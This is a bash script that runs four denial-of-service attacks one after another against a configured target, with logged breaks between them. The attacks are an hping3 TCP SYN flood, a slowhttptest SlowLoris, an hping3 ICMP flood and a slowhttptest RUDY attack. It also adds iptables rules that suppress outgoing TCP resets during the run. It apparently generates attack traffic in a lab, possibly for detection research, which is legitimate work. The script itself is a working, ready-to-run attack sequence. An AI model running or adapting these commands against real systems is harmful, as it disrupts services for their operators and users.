#!/bin/bash

#Import variables from file
source variables.sh

function interupted {
    iptables -D OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP
    #kill $pid_capture
    #scp -r /home/ somewhere:/home/
    exit
}

trap interupted 2
trap interupted 9

iptables -I OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP

#Define variables for whole attack
attack_procedure_log="/home/output/logs/attack_procedure.log"

attack(){
    #Write to file
    echo "Started "$1" attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

    #Run the attack
    ./attack_starter.sh $1 $2 $3 "$4"

    #Write to file
    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
}

#./capture.sh & pid_capture=$!

destination_ip=$machine13_ip
destination_port=$machine13_port

#Define variables for attack 1
attack_type="TCP_SYN_Flood"
attack_duration=$((7*60)) # in seconds
attack_script="hping3 --flood -p $destination_port -S $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 1" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((30*60))
#Write to file
echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

#Define variables for attack 2
attack_type="SlowLoris"
attack_duration=$((13*60)) # in seconds
attack_script="slowhttptest -c 1000 -H -g -o "/home/output/SlowLoris" -i 10 -r 200 -u http://$destination_ip -x 24 -p 3 -l $attack_duration"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 2" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((7*60))
#Write to file
echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

#Define variables for attack 3
attack_type="ping"
attack_duration=$((7*60)) # in seconds
attack_script="hping3 --flood -1 $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 3" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((40*60))
#Write to file
echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

#Define variables for attack 4
attack_type="RUDY"
attack_duration=$((15*60)) # in seconds
attack_script="slowhttptest -c 1000 -B -g -o "/home/output/RUDY" -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3 -l $attack_duration"

attack $attack_type $attack_duration $destination_ip "$attack_script"

iptables -D OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP

#kill $pid_capture

#scp -r /home/ somewhere:/home/